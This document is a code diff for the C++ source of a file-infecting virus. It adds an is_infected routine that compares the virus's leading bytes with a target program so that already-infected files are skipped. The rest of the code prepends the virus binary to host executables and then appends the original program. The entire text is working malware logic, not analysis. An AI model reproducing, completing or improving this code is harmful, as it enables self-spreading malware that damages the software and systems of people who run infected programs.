@@ -21,6 +21,7 @@ void copy_virus_binary(std::string host, std::string folder);
 void infect_file(std::string infectedHost, std::string fileName, std::string folder, std::string temporaryLocation);
 void make_temp_copy(std::string infectedHost, std::string fileName, std::string folder, std::string temporaryLocation);
 int get_virus_size();
+bool is_infected(std::string infectedHost, std::string binary);
 
 int main(int argc, char** argv) {
     std::string fileName;
@@ -31,14 +32,20 @@ int main(int argc, char** argv) {
     create_directory(folder);
     if(argc > 1){
       fileName = argv[1];
-      copy_uninfected_binary(hostName, folder);
-      make_temp_copy(hostName, fileName, folder, temporaryLocation);
-      infect_file(hostName, fileName, folder, temporaryLocation);
+      if(is_infected(hostName, fileName)){
+        copy_uninfected_binary(hostName, folder);
+      }
+      else{
+        copy_uninfected_binary(hostName, folder);
+        make_temp_copy(hostName, fileName, folder, temporaryLocation);
+        infect_file(hostName, fileName, folder, temporaryLocation);
+      }
     }
     else{
       if(hostName == "virus"){
-        build_seed(hostName);
-        return 1;
+        if(!is_infected("virus", "seed")){
+          build_seed(hostName);
+        }
       }
       fileName = "";
     }
@@ -48,7 +55,32 @@ int main(int argc, char** argv) {
 bool is_infected(std::string infectedHost, std::string binary){
 
   int virusSize = get_virus_size();
-
+  int binarySize = get_file_size(binary);
+  //cout << "V:::" << virusSize << endl; 
+  //cout << "B:::" << binarySize << endl; 
+  if(binarySize < virusSize){
+    return false;
+  }
+  else{
+    std::ifstream host(infectedHost, std::ios::binary);
+    std::ifstream bin(binary, std::ios::binary);
+    char buffer1[virusSize];
+    char buffer2[virusSize];
+    size_t actual1 = host.readsome(buffer1, virusSize);
+    size_t actual2 = bin.readsome(buffer2, virusSize);
+    if(actual1 == actual2){
+      for(int i = 0; i < virusSize; i++){
+        if(buffer1[i] != buffer2[i]){
+          return false;
+        }
+      }
+    }
+    else{
+      return false;
+    }
+  }
+  cout << "IS INFECTED!!!!!!!" << endl;
+  return true;
 }
 
 void build_seed(std::string progName){
@@ -108,7 +140,7 @@ void infect_file(std::string infectedHost, std::string fileName, std::string fol
     std::ifstream src(hostSrc, std::ios::binary);
     std::ofstream dst(hostDest, std::ios::binary);
     int virusSize = get_virus_size();
-    cout<< virusSize << endl;
+    //cout<< virusSize << endl;
     char buffer[virusSize];
     size_t actual = src.readsome(buffer, virusSize);
     dst.write(buffer, actual);
@@ -123,7 +155,7 @@ void infect_file(std::string infectedHost, std::string fileName, std::string fol
     }
     hostSrc = temporaryLocation;
     hostSrc.insert(0, folder);
-    cout << hostSrc;
+    //cout << hostSrc;
     std::ifstream src1(hostSrc, std::ios::binary);
     dst << src1.rdbuf();
     dst.close();
